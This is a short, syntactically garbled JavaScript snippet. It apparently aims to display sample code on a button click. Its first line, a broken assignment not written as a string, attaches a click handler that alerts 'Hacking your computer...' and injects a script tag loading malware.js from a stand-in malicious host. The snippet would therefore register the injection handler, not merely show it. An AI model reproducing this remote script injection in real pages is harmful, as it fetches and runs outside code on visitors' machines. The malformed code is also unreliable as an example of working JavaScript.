

var code = constantmyElement = document.getElementById('my-element'); myElement.addEventListener('click', () => {   alert('Hacking your computer...');   var script = document.createElement('script');   script.src = 'https://malicious-website.com/malware.js';   document.body.appendChild(script); });;


document.getElementById('run-code').addEventListener('click', () => {
const pre = document.createElement('pre');
pre.textContent = code;
document.body.appendChild(pre);
});